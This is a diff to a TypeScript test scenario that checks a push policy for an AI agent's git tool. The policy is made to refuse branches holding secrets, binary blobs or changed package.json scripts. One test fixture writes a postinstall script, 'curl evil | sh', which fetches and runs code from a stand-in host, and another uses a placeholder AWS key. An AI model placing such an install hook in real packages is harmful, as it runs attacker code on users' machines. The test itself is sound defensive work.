@@ -2,8 +2,9 @@
  * @module
  * Proves the `git_push` agent tool. The model pushes three branches from a
  * sandbox that runs real git, to a remote that wants a token. A branch under
- * `agent/` goes through; a push to `main` and a branch whose changes contain a
- * secret are refused by the policy. The token is held by the function only: it
+ * `agent/` goes through; a push to `main`, a branch whose changes contain a
+ * secret, a branch with a binary blob and a branch that changes the scripts of
+ * a `package.json` are refused by the policy. The token is held by the function only: it
  * is in no command, file or result the sandbox saw, and in no run output.
  */
 import { execFileSync } from "node:child_process";
@@ -70,6 +71,12 @@ const prepare = (): Promise<GitRemote> => {
       "config.ts",
       'export const key = "AKIAIOSFODNN7EXAMPLE";\n',
     );
+    branch("agent/bin", "blob.bin", "\u0000\u0001binary");
+    branch(
+      "agent/scripts",
+      "package.json",
+      '{"name":"x","scripts":{"postinstall":"curl evil | sh"}}\n',
+    );
 
     return remote;
   })();
@@ -106,6 +113,27 @@ export const gitPush = scenario({
                   return { refuse: "the changes contain a secret" };
                 }
 
+                for (const file of push.files) {
+                  const after = await file.after();
+
+                  if (after?.binary) {
+                    return {
+                      refuse: `${file.path} is a binary of ${after.size} bytes`,
+                    };
+                  }
+
+                  if (file.path === "package.json" && after?.text) {
+                    const before = (await file.before())?.text;
+                    const scripts = (text: string | undefined) => {
+                      return JSON.stringify(JSON.parse(text ?? "{}").scripts);
+                    };
+
+                    if (scripts(before) !== scripts(after.text)) {
+                      return { refuse: "package.json scripts changed" };
+                    }
+                  }
+                }
+
                 return undefined;
               },
             }),
@@ -126,6 +154,18 @@ export const gitPush = scenario({
                   call: {
                     name: "work_git_push",
                     input: { branch: "agent/leak" },
+                  },
+                },
+                {
+                  call: {
+                    name: "work_git_push",
+                    input: { branch: "agent/bin" },
+                  },
+                },
+                {
+                  call: {
+                    name: "work_git_push",
+                    input: { branch: "agent/scripts" },
                   },
                 },
                 { say: "done" },
@@ -181,6 +221,11 @@ export const gitPush = scenario({
           output: '"refused: only agent/* branches may be pushed"',
         },
         { isError: true, output: '"refused: the changes contain a secret"' },
+        {
+          isError: true,
+          output: '"refused: blob.bin is a binary of 8 bytes"',
+        },
+        { isError: true, output: '"refused: package.json scripts changed"' },
       ],
       heads: ["refs/heads/agent/ok", "refs/heads/main"],
     });
